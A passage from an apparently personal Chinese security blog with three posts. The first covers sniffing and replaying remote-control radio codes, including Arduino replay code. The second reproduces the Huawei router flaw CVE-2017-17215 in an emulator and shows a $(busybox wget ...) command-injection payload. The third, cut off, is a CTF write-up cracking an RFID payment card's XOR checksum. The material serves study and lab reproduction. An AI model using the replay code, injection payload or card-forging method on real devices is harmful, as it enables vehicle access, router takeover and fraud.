<p><img src="https://github.com/devil0x/picture/raw/master/1.19/8.png" alt=""></p>
<p>其次再选中空白部分直接剪掉即可，在导出为wav文件，直接用urh打开就可以看到波形图，再ASK调制，下方有个Autodetect parameters按钮点击一下即可，然后即可看出转换出的二进制数据。当然也可以选择inspectrum进行，但是感觉用urh似乎跟简单一些。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/11.png" alt=""></p>
<p>然后底下就可以看出了、</p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/12.png" alt=""></p>
<p>首先是1以及后边一大串空白是同步码，再然后底下 即可看出了，但是要记得在每行的最后一位空一个1，这个是下一段同步码的开始点位。现在选中的地方就是地址码加数据码的数据，没一个二进制数据由4个数字组成，Bit1 相当于 12A 宽度的高电平脉冲加 4A 宽度低电平的脉冲重复一次，而BIt0正好相反是 4a 高在是 12a 的低重复一次。</p>
<p>然后直接可以看出1000代表0,1110代表1.</p>
<h2 id="0x02-自制设备"><a href="#0x02-自制设备" class="headerlink" title="0x02.自制设备"></a>0x02.自制设备</h2><p>在淘宝可以搜到很多的非法设备，such as ：a890，还有什么d10m啥的，一般在淘宝咸鱼都是这样婶儿的。。。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/15.png" alt=""></p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/14.png" alt=""></p>
<p>一般通常都是用来破解某些东西，自制的话用arduino+cc1101即可。cc1101一般淘宝买的版本呢，中心频率都工作在433mhz，但是并不代表不可以在315工作，cc1101 有各种型号such as ：cc1101 rgpt 这种low power sub -1Ghz。</p>
<h3 id="工的话有这么几种："><a href="#工的话有这么几种：" class="headerlink" title="工的话有这么几种："></a>工的话有这么几种：</h3><h4 id="1-嗅探攻击"><a href="#1-嗅探攻击" class="headerlink" title="1.嗅探攻击"></a>1.嗅探攻击</h4><h6 id="嗅探到遥控器发射的-信号，再重放出去。"><a href="#嗅探到遥控器发射的-信号，再重放出去。" class="headerlink" title="嗅探到遥控器发射的 信号，再重放出去。"></a>嗅探到遥控器发射的 信号，再重放出去。</h6><h4 id="2-嗅探地址码"><a href="#2-嗅探地址码" class="headerlink" title="2.嗅探地址码"></a>2.嗅探地址码</h4><h6 id="因为地址码确定之后，数据码一般来说只有4种可能：1000-0100-0010-0001。such-as：通过嗅探一串锁车代码就能知道其他开车功能了。"><a href="#因为地址码确定之后，数据码一般来说只有4种可能：1000-0100-0010-0001。such-as：通过嗅探一串锁车代码就能知道其他开车功能了。" class="headerlink" title="因为地址码确定之后，数据码一般来说只有4种可能：1000,0100,0010,0001。such as：通过嗅探一串锁车代码就能知道其他开车功能了。"></a>因为地址码确定之后，数据码一般来说只有4种可能：1000,0100,0010,0001。such as：通过嗅探一串锁车代码就能知道其他开车功能了。</h6><h4 id="3-嗅探攻击"><a href="#3-嗅探攻击" class="headerlink" title="3.嗅探攻击"></a>3.嗅探攻击</h4><h6 id="暴力破解去枚举地址码。"><a href="#暴力破解去枚举地址码。" class="headerlink" title="暴力破解去枚举地址码。"></a>暴力破解去枚举地址码。</h6><h4 id="cc1101-arduino我不会"><a href="#cc1101-arduino我不会" class="headerlink" title="cc1101+arduino我不会"></a>cc1101+arduino我不会</h4><h3 id="用的arduino-超再生模块，RCswitch-h库实现"><a href="#用的arduino-超再生模块，RCswitch-h库实现" class="headerlink" title="用的arduino+超再生模块，RCswitch.h库实现"></a>用的arduino+超再生模块，RCswitch.h库实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;RCSwitch.h&gt;</span><br><span class="line"></span><br><span class="line">RCSwitch mySwitch = RCSwitch();</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">  Serial.begin(9600);</span><br><span class="line">  mySwitch.enableTransmit(9);    // 定义发送模块的数据传输针脚</span><br><span class="line">  mySwitch.setPulseLength(170);   // 定义脉冲长度，这个值具体看你使用的遥控器而定</span><br><span class="line">&#125;</span><br><span class="line">void loop() </span><br><span class="line">&#123;</span><br><span class="line">      mySwitch.send(&quot;101111010010110011001&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以输出，but没有电动车去做实验。</p>
<p>。。。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2018/11/29/路由器·漏洞挖掘/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/29/路由器·漏洞挖掘/" itemprop="url">360 iot 路由器漏洞挖掘</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-29T01:12:23+08:00">
                2018-11-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="1-复现CVE-2017-17215学习路由器漏洞分析"><a href="#1-复现CVE-2017-17215学习路由器漏洞分析" class="headerlink" title="1.复现CVE-2017-17215学习路由器漏洞分析"></a>1.复现CVE-2017-17215学习路由器漏洞分析</h2><p>然后再复现CVE-2018-17068、CVE-2018-5767、CVE-2016-5367</p>
<p>华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。</p>
<p>附上下载链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar</span><br></pre></td></tr></table></figure>
<h2 id="2-先补一下这个漏洞的详情"><a href="#2-先补一下这个漏洞的详情" class="headerlink" title="2.先补一下这个漏洞的详情"></a>2.先补一下这个漏洞的详情</h2><p><strong>零日（CVE-2017-17215）</strong></p>
<p>华为家庭网关采用通用即插即用（UPnP）协议。通过TR-064技术报告标准，该协议广泛用于嵌入式设备中，无缝连接并简化家庭和企业环境中网络的实施。</p>
<p>TR-064专为本地网络配置而设计。例如，它允许工程师从内部网络中实现基本设备配置，固件升级等。</p>
<p>但在这种情况下，华为设备中的TR-064实现通过端口37215（UPnP）暴露给WAN。</p>
<p>从查看设备的UPnP描述，可以看出它支持名为<code>DeviceUpgrade</code>的服务类型。据推测，该服务通过向“/ ctrlt / DeviceUpgrade_1”（称为controlURL）发送请求来执行固件升级操作，并使用名为“NewStatusURL”和“NewDownloadURL”的两个元素执行。</p>
<p>该漏洞允许远程管理员通过在NewStatusURL和NewDownloadURL中注入shell元字符“$（）”来执行任意命令，如下所示。</p>
<p>Upnp：</p>
<h3 id="1-分析环境是ubuntu-16-04"><a href="#1-分析环境是ubuntu-16-04" class="headerlink" title="1.分析环境是ubuntu 16.04."></a>1.分析环境是ubuntu 16.04.</h3><p>先用binwalk 解压一下：</p>
<h3 id="2-配置复现环境"><a href="#2-配置复现环境" class="headerlink" title="2. 配置复现环境"></a>2. 配置复现环境</h3><p>安装 qemu：实现mips处理器构架模拟环境。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-user-static</span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure>
<p>安装网络配置工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
<p>安装网络配置工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
<p>修改 ubuntu主机网络配置，将ubuntu主机系统中的网络接口配置文件 /etc/network/interfaces 修改为如下内容：</p>
<p><a href="https://image.3001.net/images/20180111/15156587081163.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156587081163.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"># ubuntu 16.04的系统用ens33代替eth0</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure>
<p>创建QEMU的网络接口启动脚本（/etc/qemu-ifup）并保存为如下内容：</p>
<p><a href="https://image.3001.net/images/20180111/1515658972939.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/1515658972939.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure>
<p>赋予文件/etc/qemu-ifup 可执行权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br></pre></td></tr></table></figure>
<p>重启网络使所有的配置生效：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
<p>关闭ens33，启动桥连网络br0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifdown br0 (这句话不太明白，但是特好使)</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure>
<h3 id="3-debian-org-gt-aurel32-qemu-mips-下载对应的debian-mips-qemu镜像"><a href="#3-debian-org-gt-aurel32-qemu-mips-下载对应的debian-mips-qemu镜像" class="headerlink" title="3.debian.org/&gt;~aurel32/qemu/mips/下载对应的debian mips qemu镜像"></a>3.debian.org/&gt;~aurel32/qemu/mips/下载对应的debian mips qemu镜像</h3><p>我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。</p>
<p>从<a href="https://people.debian.org/" target="_blank" rel="noopener">https://people.debian.org/</a>~aurel32/qemu/mips/下载对应的debian mips qemu镜像</p>
<p><a href="https://image.3001.net/images/20180111/15156592945471.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156592945471.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>然后启动镜像</p>
<figure class="highlight plain"><figcaption><span>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap</span><br></pre></td></tr></table></figure>
<p>我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。</p>
<p>好的，假如一切顺利，可以看到一个qemu虚拟机，</p>
<p>用root/root登录进去:</p>
<p><a href="https://image.3001.net/images/20180111/1515660657639.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/1515660657639.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>发现网络不通，ifconfig -a 看一下发现网络接口为eth1：</p>
<p><a href="https://image.3001.net/images/20180111/15156609745022.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156609745022.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>将nano /etc/network/interfaces 文件中的eth0改为eth1：</p>
<p><a href="https://image.3001.net/images/20180111/15156613687279.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156613687279.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>再用ifup eth1  将eth1启起来，运气好的话此时网络已经好了。</p>
<h1 id="（这部分是抄的，直接借鉴的）"><a href="#（这部分是抄的，直接借鉴的）" class="headerlink" title="（这部分是抄的，直接借鉴的）"></a><code>（这部分是抄的，直接借鉴的）</code></h1><h3 id="4-环境搭建好，进行实际操作"><a href="#4-环境搭建好，进行实际操作" class="headerlink" title="4. 环境搭建好，进行实际操作"></a>4. 环境搭建好，进行实际操作</h3><p>在已经登陆的qemu里输入,查看ip地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/29942034.jpg" alt=""></p>
<p>直接操作虚拟机显然比较麻烦，在ubuntu上搞个SSH 连进来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.127.141</span><br></pre></td></tr></table></figure>
<p>再次输入密码即可</p>
<p>将之前解压的固件包拷贝到虚拟机里面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root  root@192.168.127.141:/root/</span><br></pre></td></tr></table></figure>
<p>完成搭建路由器固件运行的环境。</p>
<p>找到固件所在的位置，想直接执行下upnp这个文件，报错,缺少相应的so文件造成。</p>
<p><a href="https://image.3001.net/images/20180111/15156686001122.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156686001122.png!small" alt="图片.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /root/squashfs-root /bin/sh</span><br></pre></td></tr></table></figure>
<p>来切换根目录到路由器文件系统，执行成功：</p>
<p><a href="https://image.3001.net/images/20180111/15156685477408.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156685477408.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a><br>可是发包过去仍然失败，应该是并没有启动监听服务</p>
<p>那找下端口37215</p>
<p><a href="https://image.3001.net/images/20180111/15156662004916.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156662004916.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>端口号只出现在mic文件内，看下文件内容：</p>
<p><a href="https://image.3001.net/images/20180111/15156663101284.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156663101284.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>看字符串像是一个跟网络服务相关的文件，试下运行一下：</p>
<p><a href="https://image.3001.net/images/20180111/15156664767325.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156664767325.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>看起来像是对了，</p>
<p>ubuntu上nc -vlp 80 监听一下端口，跑一下exp，80端口收到路由器发来的wget 请求包。</p>
<p><a href="https://image.3001.net/images/20180111/15156682779054.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156682779054.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>4.简单分析：</p>
<p>分析一下upnp中的关键代码:</p>
<p><a href="https://image.3001.net/images/20180112/15157334268937.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180112/15157334268937.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>根据上面payload图，newstatusurl这个节点值为 <newstatusurl>$(busybox wget -g xxxx ;xx;xx)</newstatusurl></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(a0,0x400,&quot;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&quot;,a3)</span><br></pre></td></tr></table></figure>
<p>其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（a0）</span><br></pre></td></tr></table></figure>
<p>如果看完整篇文章想上手试一下路由器漏洞的话，不要忘了当初你是为什么放弃的.</p>
<h2 id="5-甩进ida分析"><a href="#5-甩进ida分析" class="headerlink" title="5.甩进ida分析"></a>5.甩进ida分析</h2><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>根据 Check Point 的报告<a href="https://research.checkpoint.com/good-zero-day-skiddie/" target="_blank" rel="noopener">【1】</a>，该远程命令执行漏洞的漏洞点位于 UPnP 服务中。</p>
<p>UPnP 是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。</p>
<p>直接将固件中负责 UPnP 服务的 upnp 程序扔到 IDA。</p>
<p>用IDA直接打开 /HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin</p>
<p>1.通过字符串 <code>NewStatusURL</code> 对漏洞点进行定位。直接在ida中的空白处按入空格，由流程图模式改为汇编代码模式，按shift+f12打开String Windows窗口，再按入alt+t，然后直接搜索<code>NewStatus</code>来定位该漏洞位置。</p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/41289211.jpg" alt=""></p>
<p>2.跟踪数据的引用地址</p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/72288694.jpg" alt=""></p>
<p>3.找到漏洞点如下</p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/78152986.jpg" alt=""></p>
<h1 id="2-学习IDA-Pro"><a href="#2-学习IDA-Pro" class="headerlink" title="2.学习IDA Pro"></a>2.学习IDA Pro</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps：先去学习一下ida pro的用法。</span><br><span class="line">我的ida pro链接，直接拖到ubuntu点解idap即可运行</span><br><span class="line">不过64位需要安装一下依赖</span><br><span class="line"></span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 libcurl3:i386</span><br></pre></td></tr></table></figure>
<p>分析一下upnp中的关键代码:</p>
<p><a href="https://image.3001.net/images/20180112/15157334268937.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180112/15157334268937.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
<p>根据上面payload图，newstatusurl这个节点值为 <newstatusurl>$(busybox wget -g xxxx ;xx;xx)</newstatusurl></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(a0,0x400,&quot;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&quot;,a3)</span><br></pre></td></tr></table></figure>
<p>其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（a0）</span><br></pre></td></tr></table></figure>
<p>(借的图片Orz)</p>
<h3 id="IDA-Pro基本知识"><a href="#IDA-Pro基本知识" class="headerlink" title="IDA Pro基本知识"></a>IDA Pro基本知识</h3><h5 id="1-基本常识"><a href="#1-基本常识" class="headerlink" title="1. 基本常识"></a>1. 基本常识</h5><p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/55458895.jpg" alt=""></p>
<p>红色窗口为函数列表，一个文件被反编译后所有的函数列表都可以在此窗格中显示；</p>
<p>蓝色窗口为汇编代码区，双击每个函数，可以看到对应函数对应的汇编代码段；</p>
<p>黑色窗口为输出窗口，文件反汇编过程中的信息都可以在此窗口中看到。</p>
<h3 id="3-安装buildroot的坑"><a href="#3-安装buildroot的坑" class="headerlink" title="3.安装buildroot的坑"></a>3.安装buildroot的坑</h3><p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-8/82814804.jpg" alt=""></p>
<p>安装buildroot的时候不要把安装包下载到win10，然后在复制到ubuntu，容易导致hash值发生变化，引发报错。。。。。</p>
<p>啥系统软件，在啥系统内下载</p>
<h4 id="1-MIPS交叉编译环境的搭建（Buildroot）"><a href="#1-MIPS交叉编译环境的搭建（Buildroot）" class="headerlink" title="1. MIPS交叉编译环境的搭建（Buildroot）"></a>1. MIPS交叉编译环境的搭建（Buildroot）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.github的方式</span><br><span class="line"></span><br><span class="line"># 安装依赖库</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install libncurses5-dev patch</span><br><span class="line"> </span><br><span class="line"># 下载源码</span><br><span class="line">$ git clone https://github.com/buildroot/buildroot.git</span><br><span class="line"> </span><br><span class="line"># 进行编译的配置</span><br><span class="line">$ cd buildroot</span><br><span class="line">$ make clean</span><br></pre></td></tr></table></figure>
<h3 id="3-firmware-mod-kit工具的安装"><a href="#3-firmware-mod-kit工具的安装" class="headerlink" title="3. firmware-mod-kit工具的安装"></a>3. firmware-mod-kit工具的安装</h3><p>firmware-mod-kit工具的功能和binwalk工具的类似，其实firmware-mod-kit工具在功能上有调用binwalk工具提供的功能以及其他的固件解包工具的整合。下载firmware-mod-kit工具的源码进入到src目录下就能够看到firmware-mod-kit工具整合了那些固件提取和文件系统解压的工具。firmware-mod-kit工具的功能有固件文件的解包和打包、固件提取文件系统的解压和压缩、DD-WRT Web Pages的修改等，在每个整合的固件分析工具的源码文件夹里都有相关的使用说明。</p>
<h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1.安装依赖"></a>1.安装依赖</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">For Ubuntu 需要安装的依赖库文件</span><br><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br></pre></td></tr></table></figure>
<h4 id="4-下载安装"><a href="#4-下载安装" class="headerlink" title="4. 下载安装"></a>4. 下载安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line"> </span><br><span class="line"># 进入源码目录</span><br><span class="line">cd firmware-mod-kit/src</span><br><span class="line"> </span><br><span class="line"># 执行configure文件生成Makefile文件然后make编译生成可执行文件</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2018/11/28/安洵杯CTF rfid题/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/28/安洵杯CTF rfid题/" itemprop="url">安洵杯CTF rfid题</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-28T00:35:10+08:00">
                2018-11-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="安洵杯CTF-rfid题"><a href="#安洵杯CTF-rfid题" class="headerlink" title="安洵杯CTF rfid题"></a>安洵杯CTF rfid题</h1><p>首先，这题我也没拿到flag，但是经过喵师傅的讲解，暂时把校验弄出来了。</p>
<p>##　１．为啥自己看不出校验方法呢？我觉得吧，有以下几点需要注意应该会好很多:</p>
<p>1.实验一种校验方法之后没有结果，不要死磕，换方法。</p>
<p>2.加几个破解水卡的群，多接触各种稀奇古怪的校验方法。</p>
<p>3.多练习多练习。。。。</p>
<p>4.用好winhex，逆向计算器</p>
<h6 id="5-最重要的，校验的奥义：羊毛出在羊身上。就是说，校验位在哪里，你可以通过多看几个数据的变化来看出。而校验的产生，总是遵循金额位的变化，校验不管咋变，都是金额位数值通过各种公式组合加计算出来的。"><a href="#5-最重要的，校验的奥义：羊毛出在羊身上。就是说，校验位在哪里，你可以通过多看几个数据的变化来看出。而校验的产生，总是遵循金额位的变化，校验不管咋变，都是金额位数值通过各种公式组合加计算出来的。" class="headerlink" title="5.最重要的，校验的奥义：羊毛出在羊身上。就是说，校验位在哪里，你可以通过多看几个数据的变化来看出。而校验的产生，总是遵循金额位的变化，校验不管咋变，都是金额位数值通过各种公式组合加计算出来的。"></a>5.最重要的，校验的奥义：羊毛出在羊身上。就是说，校验位在哪里，你可以通过多看几个数据的变化来看出。而校验的产生，总是遵循金额位的变化，校验不管咋变，都是金额位数值通过各种公式组合加计算出来的。</h6><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>1.过一下题目 <img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/94754972.jpg" alt=""></p>
<p>2.题目提供了4个文件，12.66(2)明显有异常先略过</p>
<p>3.先以15.00为例，12.76,12.66都是一样的规律。</p>
<p>可以看出金额是15.00，根据1500十进制转换到十六进制结果为5 DC，故金额位还是常见的倒置转换。</p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/32155.jpg" alt=""></p>
<p>4.下一步查看尾部的09 0D</p>
<p>乍一看啥也看不出，我傻不愣登的还是用之前解学校水卡的方法算这个，发现结果总是+1或者-1.经喵神师傅点拨，应该是xor异或校验。</p>
<p>故算一下DC xor 05的值 = </p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/20777601.jpg" alt=""></p>
<p>出现了东西，因为校验位刚好09 0D。把其他为组也试了一下，通过。</p>
<p>5。但是只发现一位，没法构建题目所需的233.00金额。</p>
<p>然后发现DC xor 09 = </p>
